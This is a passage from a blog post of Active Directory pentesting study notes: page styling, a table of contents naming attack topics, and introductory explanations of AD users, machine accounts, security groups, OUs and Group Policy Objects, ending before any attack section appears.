---
layout: post
title:  Active Directory Pentesting Notes
description: Active Directory notes I made while going through TryHackMe material and doing some additional research.
date:   2023-02-28 
image:  '/images/active_directory_pentesting_notes.jpg'
tags:   [Active Directory, AD, Notes]
---

<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Active Directory Pentesting</title>

<style>
.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style>
The PDF version of these notes can be found <a href="https://0xd4y.com/misc/Active_Directory_Pentesting_Notes.pdf">here.</a>
</head><body>
<h1 class="page-title">Active Directory Pentesting</h1><div class="page-body"><h1 id="a0ca8eed-f519-42b6-9730-9ecfefff27c3" class="">Contact</h1><p id="d89a4ba4-9d69-4351-8066-52f206a5fc0e" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong>LinkedIn: </strong></strong></strong></strong></strong></strong></strong></strong></strong><a href="https://www.linkedin.com/in/segev-eliezer/">https://www.linkedin.com/in/segev-eliezer/</a></p><p id="6c811aa8-1e4c-42b6-9ad2-9c0d6bcf6570" class=""><strong>YouTube</strong>: <a href="https://YouTube.com/@0xd4y">https://YouTube.com/@0xd4y</a> </p><p id="d76d32ac-5a63-4ddf-96ad-c7cfe9561673" class=""><strong><strong><strong><strong>Website: </strong></strong></strong></strong><a href="https://0xd4y.com">https://0xd4y.com</a> </p><p id="5fc1ed02-41c6-4bdf-ac77-bf6e0608da1c" class=""><strong><strong><strong><strong><strong><strong>GitHub: </strong></strong></strong></strong></strong></strong><a href="https://GitHub.com/0xd4y">https://GitHub.com/0xd4y</a> </p><h1 id="d5b73608-043e-4816-872f-61a597b1103f" class=""><strong>Table of Contents</strong></h1><nav id="42b987a8-df30-4286-bc8f-c7c9dc355d96" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#a0ca8eed-f519-42b6-9730-9ecfefff27c3">Contact</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#d5b73608-043e-4816-872f-61a597b1103f"><strong>Table of Contents</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#a4fb6547-ce72-4eb0-86cc-f083ea47e342">Objects</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#28d215c5-0685-487a-bb65-a2f9641b7cc7">Users</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8f268a97-1709-4d08-8777-6c254cff5067">People</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#16090bfe-eb30-4366-bdfa-6cbcf57490e0">Service</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b6d82c19-7423-4173-8080-eb79f983d079">Machines</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#eddfde7f-f885-44fd-9195-67732bb62de6">Security Groups</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#cb7ce8c9-4d39-4404-a2ab-5daaf624ba81">Organization Units (OUs)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#cd2720f7-3b69-4e5e-8491-24527ac6fc5f">Group Policy Objects (GPOs)</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#899de4ac-ae2c-4cb0-85fd-a9661cc31fff">Authentication</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#67d615d2-e21a-4e42-849f-163e51914d23">Kerberos</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cb503efd-0e1a-4634-8a7c-5b68dcea404b">Overpass-the-Hash / Pass-the-Key</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#30430466-8e92-4794-98f5-3f352359f5ce">NetNTLM </a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#df083491-75af-466f-8d86-77a0b41a6fd3">LDAP</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#65f936de-132b-4343-a6cb-fe86c9c2064b">Enumeration</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#610e2297-43d5-431d-abe6-73f4ada11a65">Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4e6c85b7-ce72-4620-8c09-26b478bbf52e">Unconstrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#3a9af721-e1be-4e61-b966-af3c80c7fb7c">Constrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e890f38e-232d-4855-8ee5-84e401edd3e1">Resource-Based Constrained Delegation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#906fd3c0-8ba1-42e0-a49a-a7c567e2040d">Privilege Escalation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#00888bb5-8f80-4878-aada-5231850d9443">Lateral Movement</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2d875865-8541-4b91-a9d1-26abe8dbd648">Service</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ebc20035-3771-4954-a96a-aae70996e153">Windows Management Implementation (WMI)</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#217e8876-673c-45a9-94b0-a56794e83c0d">RDP Hijacking</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#624fe4eb-3732-426f-b686-fc70916c5195">Remote Port Forwarding</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7e463bf9-0e3e-4d6e-9556-e2f5890f00d4">Common Misconfigurations</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#07303d01-b9e5-41fb-b5ee-b5a44b8c7297">Access Control Entry (ACE)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1d7315d4-4129-4b4f-9e64-fb82e324b0c7">Printer Bug</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#772274af-5905-438d-a1ef-242ead2d03af">Detection</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2ea75ca4-e438-4ff2-87a4-2ad634daa021">AMSI </a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ffa2d4b8-249c-4067-aac5-ce9e87b33247">Obfuscation</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#23c63438-50fb-4dcf-a350-73f1160b780c">Windows Security Features</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7fa24d65-86aa-43a2-8d43-372590893945">User Account Control (UAC)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#48e63050-b6a4-4ced-a5a2-ad2fcbc284d1">AppLocker</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ca19611c-1377-474a-9690-f89e91fe55ed">Bypass</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2284ab40-78de-4f24-804d-78199ca69b17">Misc</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d05d410c-9e94-4734-9f41-edfec59321c3">Change User Password</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#49705e23-d328-422f-a785-199d0161125b">Hostname vs IP</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d7126e4-8296-4050-937a-690e6ed3d494">Create Credential Block</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#850c4e3b-82e8-4351-b8db-88ab18b3b130">SMB</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#82a704e8-0b28-4d33-800f-5727a71f6ccb">Shares</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d285c933-7a31-40f3-a063-2381ca68d9ef">Signing</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#cd89496e-4432-4a7d-954a-c27846ef1bc7">Impacket</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#cf007439-fe67-4ef6-b21e-8e6ad9d42be0">NTLM Relay</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#fa729c7b-ffa6-4817-b5e8-875d3a827911">Tools</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#7726dafa-59f1-4434-9ed4-5009eb4eee22">Recon</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b6cd0ca1-bc0e-4a80-a081-661ec448ef08">Exploitation</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#00f1d15a-1cc2-426f-b7a3-20f1d00d9ab4">AMSI Bypassing</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#83d65774-8c3e-4df2-ab01-4bf7226a0b8a">References</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#15e11dc4-5cd8-41b3-9ce0-dbbfe9b25b18">TryHackMe Resources</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#a78ef902-4b83-45e1-9490-2804dc40faaf">Misc Resources</a></div></nav><h1 id="a4fb6547-ce72-4eb0-86cc-f083ea47e342" class="">Objects</h1><h2 id="28d215c5-0685-487a-bb65-a2f9641b7cc7" class="">Users</h2><ul id="361f1ac8-bc0f-4fdc-95a0-b75a29a8237c" class="bulleted-list"><li style="list-style-type:disc">security principals</li></ul><ul id="2df856f6-1d91-43d3-b348-0fd500e6798c" class="bulleted-list"><li style="list-style-type:disc">can be authenticated by domain</li></ul><ul id="2ab698e8-7e94-45a9-835b-865a7b9f41c4" class="bulleted-list"><li style="list-style-type:disc">assigned privileges over resources</li></ul><h3 id="8f268a97-1709-4d08-8777-6c254cff5067" class="">People</h3><ul id="73f83526-5788-4ba6-b553-065075733a9b" class="bulleted-list"><li style="list-style-type:disc">a person can be a user</li></ul><h3 id="16090bfe-eb30-4366-bdfa-6cbcf57490e0" class="">Service</h3><ul id="ff05d941-1395-499f-8763-b6701bcdcd65" class="bulleted-list"><li style="list-style-type:disc">services can also be users (e.g. IIS or MSSQL)</li></ul><ul id="584ab6dd-4d06-45ad-b937-aceccaccc76e" class="bulleted-list"><li style="list-style-type:disc">services only have privileges to run their specific service</li></ul><h2 id="b6d82c19-7423-4173-8080-eb79f983d079" class="">Machines</h2><ul id="b43b44fe-de91-405b-abab-a9a7c74a0bcb" class="bulleted-list"><li style="list-style-type:disc">security principals</li></ul><ul id="8622cdd4-e93b-4714-b5d3-ded3f034ee74" class="bulleted-list"><li style="list-style-type:disc">machine object created for all computers in AD domain</li></ul><ul id="fe89c42b-f3c9-4674-a42b-61654a46ff42" class="bulleted-list"><li style="list-style-type:disc">machine accounts have local admin rights<ul id="4b0321c3-7773-4c7d-a378-0a72003462c6" class="bulleted-list"><li style="list-style-type:circle">can be logged into, but password are typically rotated every 30 days and contain 120 characters</li></ul><ul id="cbb85438-4db5-4c9e-9594-2340c4937dc5" class="bulleted-list"><li style="list-style-type:circle">used by domain controllers to synchronize AD updates and changes</li></ul></li></ul><ul id="543b0ab4-4d8a-435a-9f4f-b8aad1322374" class="bulleted-list"><li style="list-style-type:disc">machine account name is the name of the machine followed by dollar sign</li></ul><h2 id="eddfde7f-f885-44fd-9195-67732bb62de6" class="">Security Groups</h2><ul id="65942403-9449-45c8-ab7b-11240629ebeb" class="bulleted-list"><li style="list-style-type:disc">users assigned to security group will inherit the permissions of the group</li></ul><p id="84c20fb6-d13c-47be-b7c3-cb054fd11f4d" class=""><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">Default groups</a>:</p><table id="50cd20ac-7e84-4a43-acee-acd160ecd69a" class="simple-table"><tbody><tr id="c283b915-2479-446a-9552-5eff5c40ddee"><td id="Qp~:" class="" style="width:203.00000762939453px"><strong>Security Group </strong></td><td id="vFRU" class="" style="width:525.0000076293945px"><strong>Description</strong></td></tr><tr id="abf3dd1d-6fac-4958-a963-755afae5d2a9"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Domain Admins</em></td><td id="vFRU" class="" style="width:525.0000076293945px">Admin privileges over entire domain
</td></tr><tr id="b25986cf-e82b-4c30-9178-994c92f3756f"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Server Operators</em></td><td id="vFRU" class="" style="width:525.0000076293945px">- Administer Domain Controllers
- Can’t change administrative group memberships</td></tr><tr id="df6e2997-b770-4511-8bb3-246772d67921"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Backup Operators</em></td><td id="vFRU" class="" style="width:525.0000076293945px">- Access any file
- Backup data on computers</td></tr><tr id="eb9433f5-5fe5-48c5-ab87-8cc912220022"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Account Operators</em></td><td id="vFRU" class="" style="width:525.0000076293945px">- Create or modify other accounts in domain</td></tr><tr id="99cbcbc3-72d2-42bb-b164-d6e31fe02ca7"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Domain Users</em></td><td id="vFRU" class="" style="width:525.0000076293945px">All users in domain</td></tr><tr id="6b5259d9-f37d-4194-9f14-d1acc90e166e"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Domain Computers</em></td><td id="vFRU" class="" style="width:525.0000076293945px">All computers in domain</td></tr><tr id="3945850e-315b-4d79-8d7d-e3aa175b0de3"><td id="Qp~:" class="" style="width:203.00000762939453px"><em>Domain Controllers</em></td><td id="vFRU" class="" style="width:525.0000076293945px">All Domain Controllers in domain</td></tr></tbody></table><h1 id="cb7ce8c9-4d39-4404-a2ab-5daaf624ba81" class="">Organization Units (OUs)</h1><ul id="879c74a3-ec63-47d7-be32-a79a397b7244" class="bulleted-list"><li style="list-style-type:disc">used to help apply policies to users and computers</li></ul><figure id="3a00d1fe-8ae6-473a-a5b8-543c8934c5ea" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled.png"><img style="width:835px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled.png"/></a></figure><h3 id="cd2720f7-3b69-4e5e-8491-24527ac6fc5f" class="">Group Policy Objects (GPOs)</h3><ul id="3ef68e54-cd4f-46aa-87ee-45311ce677be" class="bulleted-list"><li style="list-style-type:disc">used for applying policies to OUs</li></ul><ul id="69020ed8-44df-4cdf-8c9a-db876d768a8f" class="bulleted-list"><li style="list-style-type:disc">collection of settings</li></ul><ul id="9a198c39-b7cb-45d2-bc34-f51cab8593a9" class="bulleted-list"><li style="list-style-type:disc">distributed to network in SYSVOL share<ul id="de375a9e-d9d3-4278-abf1-c0c954c8d719" class="bulleted-list"><li style="list-style-type:circle">all users have access to SYSVOL to periodically sync their GPOs (can take up to 2 hours)<ul id="67ee00ae-52e4-4294-8d43-cd518bf3f3fa" class="bulleted-list"><li style="list-style-type:square">syncs can be forced with <code>gpupdate /force</code></li></ul></li></ul></li></ul><figure id="f83a4a13-cad5-4132-a8af-1c469723cdb3" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%201.png"><img style="width:954px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%201.png"/></a></figure><ul id="987020d0-5242-46bd-a7cf-eaa6fe1505c7" class="bulleted-list"><li style="list-style-type:disc">GPOs applied to OU propagate to all sub-OUs (works as hierarchy)</li></ul><p id="cc57accd-6f7f-41ff-9459-33c6bba2d50c" class=""><span style="border-bottom:0.05em solid">Example GPO Settings</span></p><figure id="02943861-bb2e-4b42-9a12-968f5408b582" class="image"><a 